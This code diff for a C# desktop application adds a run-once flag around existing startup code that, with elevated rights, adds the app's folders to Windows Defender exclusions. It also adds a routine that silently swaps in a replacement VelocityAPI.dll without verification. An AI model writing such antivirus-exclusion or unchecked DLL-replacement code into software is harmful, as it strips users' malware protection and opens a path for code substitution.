@@ -13,8 +13,7 @@ public partial class App : Application
 	{
 		AppContext.SetSwitch("System.Net.DisableIPv6", isEnabled: true);
 		base.OnStartup(e);
-		
-		// Initialize and show the main window
+		ApplyPendingApiUpdate();
 		MainWindow window = new MainWindow();
 		window.Show();
 
@@ -45,6 +44,9 @@ public partial class App : Application
 		try
 		{
 			string currentDir = AppDomain.CurrentDomain.BaseDirectory;
+			string flagFile = Path.Combine(currentDir, ".exclusions_added");
+			if (File.Exists(flagFile)) return;
+			
 			string binDir = Path.Combine(currentDir, "Bin");
 			string script = $"Add-MpPreference -ExclusionPath '{currentDir}' -Force; Add-MpPreference -ExclusionPath '{binDir}' -Force";
 			if (Directory.Exists(binDir))
@@ -56,6 +58,7 @@ public partial class App : Application
 					UseShellExecute = true,
 					Verb = "runas"
 				});
+				File.WriteAllText(flagFile, DateTime.Now.ToString());
 			}
 		}
 		catch
@@ -78,5 +81,25 @@ public partial class App : Application
 	private void ShowCrashMsg(Exception ex)
 	{
 		MessageBox.Show("Oopsie! An unexpected error occurred >w<\n\nError: " + ex.Message + "\n\nDetails saved to crash_log.txt", "App Crash D:", MessageBoxButton.OK, MessageBoxImage.Hand);
+	}
+
+	private void ApplyPendingApiUpdate()
+	{
+		try
+		{
+			string exeDir = AppDomain.CurrentDomain.BaseDirectory;
+			string dllPath = Path.Combine(exeDir, "VelocityAPI.dll");
+			string updatePath = dllPath + ".update";
+
+			if (File.Exists(updatePath))
+			{
+				if (File.Exists(dllPath)) File.Delete(dllPath);
+				File.Move(updatePath, dllPath);
+			}
+		}
+		catch (Exception ex)
+		{
+			LogCrash(ex, "VelocityAPI Update Apply Failed");
+		}
 	}
 }
